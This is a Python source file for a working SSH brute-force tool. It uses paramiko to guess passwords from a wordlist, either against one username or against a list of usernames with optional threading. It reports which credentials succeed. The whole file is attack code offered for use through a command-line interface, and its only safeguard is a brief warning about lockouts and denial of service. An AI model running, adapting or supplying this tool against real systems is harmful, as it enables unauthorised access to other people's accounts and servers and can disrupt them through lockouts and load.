import paramiko
import argparse
import time
import threading

def normal_brute_force(ip, username, passwords_file):
    """Normal brute force attack using a list of passwords for one user."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Try to read the password file
        try:
            with open(passwords_file, 'r') as pw_file:
                passwords = [line.strip() for line in pw_file]
        except FileNotFoundError:
            print(f"Password file '{passwords_file}' does not exist.")
            return

        start_time = time.time()  # Start time for the entire attack

        for password in passwords:
            print(f"Trying {username} with password: {password}")
            try:
                client.connect(hostname=ip, username=username, password=password, timeout=3)
                duration = time.time() - start_time  # Calculate duration
                print(f"Success! Password '{password}' works for username: {username}. Time taken: {duration:.2f} seconds")
                return password  # Return valid password
            except paramiko.AuthenticationException:
                print(f"Failed login for {username} with password: {password}")
            except Exception as e:
                print(f"Error occurred: {e}")

        total_duration = time.time() - start_time  # Total time taken
        print(f"No valid password found for {username}. Total time: {total_duration:.2f} seconds.")
    except Exception as e:
        print(f"Connection failed: {e}")

def reverse_brute_force(ip, passwords_file, usernames_file, use_threads):
    """Reverse brute force attack using a list of passwords on multiple users."""
    
    def attempt_login(username, passwords):
        """Function to attempt login for a single user with given passwords."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        user_start_time = time.time()  # Start time for this user
        found_password = False  # Flag to indicate if the user has been found

        for password in passwords:
            print(f"Trying {username} with password: {password}")
            try:
                client.connect(hostname=ip, username=username, password=password, timeout=3)
                duration = time.time() - user_start_time  # Duration for this user
                print(f"Success! Password '{password}' works for username: {username}. Time taken for this user: {duration:.2f} seconds.")
                found_password = True
                break  # Exit the password loop for this user
            except paramiko.AuthenticationException:
                print(f"Failed login for {username} with password: {password}")
            except Exception as e:
                print(f"Error occurred: {e}")
        
        if not found_password:
            user_duration = time.time() - user_start_time  # Time for trying all passwords on this user
            print(f"No valid password found for {username}. Time taken for this user: {user_duration:.2f} seconds.")

    try:
        # Try to read the password file
        try:
            with open(passwords_file, 'r') as pw_file:
                passwords = [line.strip() for line in pw_file]
        except FileNotFoundError:
            print(f"Password file '{passwords_file}' does not exist.")
            return
        
        # Try to read the usernames file
        try:
            with open(usernames_file, 'r') as user_file:
                usernames = [line.strip() for line in user_file]
        except FileNotFoundError:
            print(f"Usernames file '{usernames_file}' does not exist.")
            return

        overall_start_time = time.time()  # Start time for the overall attack

        if use_threads:
            threads = []
            for username in usernames:
                # Create a thread for each user
                thread = threading.Thread(target=attempt_login, args=(username, passwords))
                threads.append(thread)
                thread.start()

            # Wait for all threads to finish
            for thread in threads:
                thread.join()
        else:
            for username in usernames:
                attempt_login(username, passwords)

        overall_duration = time.time() - overall_start_time  # Total time taken
        print(f"Reverse attack completed. Total time: {overall_duration:.2f} seconds.")
    except Exception as e:
        print(f"Connection failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="SSH Brute Force Tool - WARNING: Use responsibly to avoid DoS.")
    parser.add_argument("ip", help="Target IP address or hostname")
    parser.add_argument("attack_type", choices=["normal", "reverse"], 
                        help="Type of attack: 'normal' for password guessing on one user, 'reverse' for username guessing with a list of passwords")
    parser.add_argument("passwords_file", help="File containing passwords (one per line) - Use a short list to avoid lockouts.")
    parser.add_argument("-u", "--username", help="Username for normal attack (required for normal mode)")
    parser.add_argument("-u_list", "--usernames_file", help="File containing usernames (required for reverse mode)")
    parser.add_argument("-t", "--threads", action='store_true', help="Enable threading for reverse attack")

    args = parser.parse_args()

    if args.attack_type == "normal":
        if not args.username:
            print("Username is required for normal attack.")
            return
        normal_brute_force(args.ip, args.username, args.passwords_file)

    elif args.attack_type == "reverse":
        if not args.usernames_file:
            print("Usernames file is required for reverse attack.")
            return
        reverse_brute_force(args.ip, args.passwords_file, args.usernames_file, args.threads)

if __name__ == "__main__":
    main()
